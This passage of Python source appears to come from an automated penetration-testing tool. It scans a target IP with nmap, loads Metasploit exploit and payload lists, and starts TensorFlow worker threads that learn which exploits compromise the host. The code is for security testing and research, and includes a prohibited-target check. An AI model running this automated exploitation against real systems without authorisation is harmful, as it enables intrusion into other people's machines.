    ip_addr = args['<ip_addr>']
    mode = args['<mode>']
    port = args['<port>']
    service = args['<product>']
    return ip_addr, mode, port, service


def check_port_value(port=None, service=None):
    if port is not None:
        if port.isdigit() is False:
            Utilty().print_message(OK, 'Invalid port number: {}'.format(port))
            return False
        elif (int(port) < 1) or (int(port) > 65535):
            Utilty().print_message(OK, 'Invalid port number: {}'.format(port))
            return False
        elif port not in com_port_list:
            Utilty().print_message(OK, 'Not open port number: {}'.format(port))
            return False
        elif service is None:
            Utilty().print_message(OK, 'Invalid service name: {}'.format(str(service)))
            return False
        elif type(service) == 'int':
            Utilty().print_message(OK, 'Invalid service name: {}'.format(str(service)))
            return False
        else:
            return True
    else:
        return False


com_port_list = []
com_exploit_list = []
com_payload_list = []
com_indicate_flag = False


if __name__ == '__main__':
    util = Utilty()

    
    rhost, mode, port, service = command_parse()
    if is_valid_ip(rhost) is False:
        util.print_message(FAIL, 'Invalid IP address: {}'.format(rhost))
        exit(1)
    if mode not in ['train', 'test']:
        util.print_message(FAIL, 'Invalid mode: {}'.format(mode))
        exit(1)

    
    show_banner(util, 0.1)

    
    env = Metasploit(rhost)
    if rhost in env.prohibited_list:
        util.print_message(FAIL, 'Target IP={} is prohibited.\n'
                                 '    Please check "config.ini"'.format(rhost))
        exit(1)
    nmap_result = 'nmap_result_' + env.rhost + '.xml'
    nmap_command = env.nmap_command + ' ' + nmap_result + ' ' + env.rhost + '\n'
    env.execute_nmap(env.rhost, nmap_command, env.nmap_timeout)
    com_port_list, proto_list, info_list = env.get_port_list(nmap_result, env.rhost)
    com_exploit_list = env.get_exploit_list()
    com_payload_list = env.get_payload_list()
    com_payload_list.append('no payload')

    
    exploit_tree = env.get_exploit_tree()

    
    com_indicate_flag = check_port_value(port, service)
    if com_indicate_flag:
        target_tree, com_port_list = env.get_target_info_indicate(rhost, proto_list, info_list, port, service)
    else:
        target_tree = env.get_target_info(rhost, proto_list, info_list)

    
    TRAIN_WORKERS = env.train_worker_num
    TEST_WORKER = env.test_worker_num
    MAX_STEPS = env.train_max_steps
    MAX_TRAIN_NUM = env.train_max_num
    Tmax = env.train_tmax

    env.client.termination(env.client.console_id)  
    NUM_ACTIONS = len(com_payload_list)  
    NONE_STATE = np.zeros(NUM_STATES)  

    
    frames = 0                
    isFinish = False          
    post_exploit_count = 0    
    exploit_count = 0         
    plot_count = [0]          
    plot_pcount = [0]         
    SESS = tf.Session()       

    with tf.device("/cpu:0"):
        parameter_server = ParameterServer()
        threads = []

        if mode == 'train':
            
            for idx in range(TRAIN_WORKERS):
                thread_name = 'local_thread' + str(idx + 1)
                threads.append(Worker_thread(thread_name=thread_name,
                                             thread_type="learning",
                                             parameter_server=parameter_server,
                                             rhost=rhost))
        else:
            
            for idx in range(TEST_WORKER):
                thread_name = 'local_thread1'
                threads.append(Worker_thread(thread_name=thread_name,
                                             thread_type="test",
                                             parameter_server=parameter_server,
                                             rhost=rhost))

    
    saver = tf.train.Saver()

    
    COORD = tf.train.Coordinator()  
    SESS.run(tf.global_variables_initializer())  

    running_threads = []
    if mode == 'train':
        
        if os.path.exists(env.save_file) is True:
            
            util.print_message(OK, 'Restore learned data.')
            saver.restore(SESS, env.save_file)

        
        for worker in threads:
            job = lambda: worker.run(exploit_tree, target_tree, saver, env.save_file)
            t = threading.Thread(target=job)
            t.start()
    else:
        
        
        util.print_message(OK, 'Restore learned data.')
        saver.restore(SESS, env.save_file)
        for worker in threads:
            job = lambda: worker.run(exploit_tree, target_tree)
            t = threading.Thread(target=job)
            t.start()
